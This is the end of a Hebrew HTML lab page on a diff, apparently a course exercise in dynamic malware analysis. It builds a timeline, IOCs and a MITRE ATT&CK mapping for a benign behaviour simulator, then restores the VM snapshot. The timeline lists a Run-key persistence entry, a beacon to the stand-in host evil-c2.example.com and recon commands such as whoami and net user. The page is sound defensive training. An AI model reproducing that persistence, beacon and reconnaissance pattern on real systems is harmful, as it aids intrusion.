+    </li>
+    <li class="step">
+      <div class="step-title">שלב 11 — בניית Timeline + IOCs + MITRE</div>
+      <p>בנה Timeline של ההתנהגות:</p>
+              <pre>00:00 - behavior-sim.exe started (PID X, parent explorer.exe)
+00:01 - File created: C:\Users\...\AppData\Roaming\sim.dat
+00:02 - Registry: HKCU\...\Run\BehaviorSim = C:\path\sim.exe
+00:03 - DNS query: evil-c2.example.com
+00:04 - HTTP GET: http://evil-c2.example.com/beacon
+00:05 - cmd.exe spawned -&gt; whoami
+00:06 - cmd.exe spawned -&gt; ipconfig /all
+00:07 - cmd.exe spawned -&gt; net user</pre>
+              <p>מיפוי MITRE ATT&CK:</p>
+              <table>
+                <tr><th>Technique</th><th>Evidence</th></tr>
+                <tr><td>T1547.001 - Registry Run Keys</td><td>HKCU\...\Run\BehaviorSim</td></tr>
+                <tr><td>T1071.001 - Application Layer Protocol</td><td>HTTP beacon</td></tr>
+                <tr><td>T1059.003 - Windows Command Shell</td><td>cmd.exe spawned</td></tr>
+                <tr><td>T1082 - System Information Discovery</td><td>ipconfig /all</td></tr>
+                <tr><td>T1087 - Account Discovery</td><td>net user</td></tr>
+                <tr><td>T1016 - System Network Configuration Discovery</td><td>ipconfig</td></tr>
+              </table>
+    </li>
+    <li class="step">
+      <div class="step-title">שלב 12 — שחזור Snapshot</div>
+      <pre># חובה לשחזר Snapshot אחרי ניתוח דינמי!
+# גם של סימולטור שפיר.
+# VirtualBox: Machine -&gt; Restore Snapshot -&gt; "clean-baseline"</pre>
+    </li>
+  </ol>
+</div>
+
+<div class="section">
+  <h2>תוצאה צפויה</h2>
+  <ul class="prereq">
+    <li>Timeline שלם של התנהגות הסימולטור</li>
+    <li>5+ MITRE ATT&CK techniques ממופות</li>
+    <li>Persistence ב-Registry מתועד</li>
+    <li>File drops ב-AppData מתועדים</li>
+    <li>תעבורת DNS/HTTP מדומה נלכדה ב-FakeNet</li>
+    <li>VM שוחזר ל-Snapshot נקי</li>
+  </ul>
+</div>
+
+<div class="section">
+  <div class="sysint">
+    <strong>שילוב עם Sysinternals:</strong>
+    <p>במקום Regshot — אפשר להשתמש ב-Autoruns לפני ואחרי הרצה (Compare). היתרון: גם persistence מסוגי scheduled tasks, services, drivers — לא רק Run keys.</p>
+  </div>
+</div>
+
+<div class="section">
+  <div class="questions">
+    <h3>שאלות לסיכום</h3>
+    <ol>
+      <li>מדוע Snapshot חובה לפני ניתוח דינמי?</li>
+      <li>מה היתרון של Host-Only על פני NAT ברשת ה-VM?</li>
+      <li>מה ההבדל בין capture filter ל-display filter ב-Wireshark?</li>
+      <li>איך נוזקה יכולה לזהות שהיא ב-VM (VM Evasion)?</li>
+      <li>מדוע צריך לכבות Defender — האם זה לא פחות בטוח?</li>
+      <li>מה ProcMon מראה ש-Process Explorer לא?</li>
+      <li>בנה דוגמה ל-IOC שאפשר לחלץ מתוך לוג FakeNet (לא Wireshark).</li>
+    </ol>
+  </div>
+</div>
+
+<div class="section">
+  <h2>סיכום</h2>
+  <p>Dynamic Analysis Bench = הצעד אחרי Static. הסביבה: Snapshot + Host-Only Network + FakeNet + ProcMon + Wireshark + Regshot. הניתוח: timeline של התנהגות, IOCs, MITRE mapping. תמיד שחזור Snapshot אחרי.</p><p><strong>מעבדה הבאה:</strong> Lab 4 — Volatility Memory Forensics.</p>
+</div>
+
+</div>
+<footer>&copy; כל הזכויות שמורות | CyberLabs | Day 5 Lab 3</footer>
+</body>
+</html>
